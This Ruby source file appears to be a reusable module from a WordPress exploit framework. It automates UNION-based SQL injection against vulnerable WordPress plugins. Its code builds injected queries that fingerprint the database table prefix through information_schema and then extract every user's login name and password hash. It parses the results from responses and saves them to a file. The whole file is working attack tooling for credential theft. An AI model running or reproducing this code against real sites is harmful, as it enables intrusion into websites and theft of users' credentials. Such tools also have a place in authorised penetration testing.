# frozen_string_literal: true

# Provides reusable functionality for hash dump modules.
module Wpxf::WordPress::HashDump
  include Wpxf

  # Initialises a new instance of {HashDump}
  def initialize
    super

    _update_info_without_validation(
      desc: %(
        This module exploits an SQL injetion vulnerability to generate
        a dump of all the user hashes in the database.
      )
    )

    register_options([
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the hash dump to',
        required: false
      )
    ])
  end

  # @return [String] the path to export the hash dump to.
  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  # @return [Boolean] returns true if only one row of the SQL query will be displayed per request.
  def reveals_one_row_per_request
    false
  end

  # @return [Array] an array of values to use in the generated union statement.
  def hashdump_custom_union_values
    []
  end

  # @return [String] a unique SQL select statement that can be used to extract the hashes.
  def hashdump_sql_statement
    cols = _hashdump_union_cols
    cols[hashdump_visible_field_index] = "concat(#{_bof_token},0x3a,user_login,0x3a,user_pass,0x3a,#{_eof_token})"

    query = "select #{cols.join(',')} from #{table_prefix}users"
    return query unless reveals_one_row_per_request

    "#{query} limit #{_current_row},1"
  end

  # @return [String] a unique select statement that can be used to fingerprint the database prefix.
  def hashdump_prefix_fingerprint_statement
    cols = _hashdump_union_cols
    cols[hashdump_visible_field_index] = "concat(#{_bof_token},0x3a,table_name,0x3a,#{_eof_token})"

    query = "select #{cols.join(',')} from information_schema.tables where table_schema = database()"
    return query unless reveals_one_row_per_request

    "#{query} limit #{_current_row},1"
  end

  # @return [Integer] the zero-based index of the column which is visible in the response output.
  def hashdump_visible_field_index
    0
  end

  # @return [Integer] the number of columns in the vulnerable SQL statement.
  def hashdump_number_of_cols
    1
  end

  # @return [Symbol] the HTTP method to use when requesting the hash dump.
  def hashdump_request_method
    :get
  end

  # @return [Hash] the parameters to be used when requesting the hash dump.
  def hashdump_request_params
    nil
  end

  # @return [Hash, String] the body to be used when requesting the hash dump.
  def hashdump_request_body
    nil
  end

  # @return [String] the URL of the vulnerable page.
  def vulnerable_url
    nil
  end

  # @return [String] the table prefix determined by the module.
  def table_prefix
    @table_prefix
  end

  # Run the module.
  # @return [Boolean] true if successful.
  def run
    return false unless super

    _generate_id_tokens

    @_current_row = 0
    emit_info 'Determining database prefix...'
    return false unless _determine_prefix
    emit_success "Found prefix: #{table_prefix}", true

    @_current_row = 0
    emit_info 'Dumping user hashes...'
    hashes = _dump_and_parse_hashes.uniq
    _output_hashdump_table(hashes)

    _export_hashes(hashes) if export_path
    true
  end

  private

  def _hashdump_union_cols
    cols = Array.new(hashdump_number_of_cols) { |_i| '0' }

    hashdump_custom_union_values.each_with_index do |value, index|
      cols[index] = value unless value.nil?
    end

    cols
  end

  def _bof_token
    @_bof_token
  end

  def _eof_token
    @_eof_token
  end

  def _current_row
    @_current_row
  end

  def _execute_hashdump_request
    res = execute_request(
      method: hashdump_request_method,
      url: vulnerable_url,
      params: hashdump_request_params,
      body: hashdump_request_body,
      cookie: session_cookie
    )

    return false unless res&.code == 200
    res
  end

  def _dump_and_parse_hashes
    unless reveals_one_row_per_request
      res = _execute_hashdump_request
      return _parse_hashdump_body(res.body)
    end

    eof = false
    hashes = []

    until eof
      res = _execute_hashdump_request
      break unless res.body.match?(/#{_bof_token}\:(.*?)\:#{_eof_token}/)

      hash = _parse_hashdump_body(res.body)
      hashes.push([hash[0][0], hash[0][1]]) if hash
      @_current_row += 1
    end

    hashes
  end

  def _build_prefix_request_body
    body = hashdump_request_body
    unless body.nil?
      if body.is_a?(Hash)
        body.each do |k, v|
          body[k] = v.gsub(hashdump_sql_statement, hashdump_prefix_fingerprint_statement)
        end
      else
        body.gsub!(hashdump_sql_statement, hashdump_prefix_fingerprint_statement)
      end
    end

    body
  end

  def _build_prefix_request_params
    params = hashdump_request_params

    params&.each do |k, v|
      params[k] = v.gsub(hashdump_sql_statement, hashdump_prefix_fingerprint_statement)
    end

    params
  end

  def _determine_prefix
    body = _build_prefix_request_body
    params = _build_prefix_request_params

    res = execute_request(
      method: hashdump_request_method,
      url: vulnerable_url,
      params: params,
      body: body,
      cookie: session_cookie
    )

    return nil unless res&.code == 200

    # If the prefix is found, regardless of the row mode, return it.
    @table_prefix = res.body[/#{_bof_token}\:([^:]+?)usermeta\:#{_eof_token}/, 1]
    return @table_prefix if @table_prefix
    return nil unless reveals_one_row_per_request

    # If the bof and eof tokens weren't found at all, there are no more rows available.
    return nil unless res.body.match?(/#{_bof_token}\:(.*?)\:#{_eof_token}/)

    # If the tokens were found, then we can try to query another row.
    @_current_row += 1
    _determine_prefix
  end

  def _output_hashdump_table(hashes)
    rows = []
    rows.push(user: 'Username', hash: 'Hash')
    hashes.each do |pair|
      rows.push(user: pair[0], hash: pair[1])
    end

    emit_table rows
  end

  def _export_hashes(hashes)
    File.open(export_path, 'w') do |f|
      hashes.each do |pair|
        f.puts "#{pair[0]}:#{pair[1]}"
      end
    end

    emit_success "Saved dump to #{export_path}"
  end

  def _parse_hashdump_body(body)
    pattern = /#{_bof_token}\:(.+?)\:(.+?)\:#{_eof_token}/
    body.scan(pattern)
  end

  def _generate_id_tokens
    @_eof_token = Utility::Text.rand_numeric(10)
    @_bof_token = Utility::Text.rand_numeric(10)
  end
end
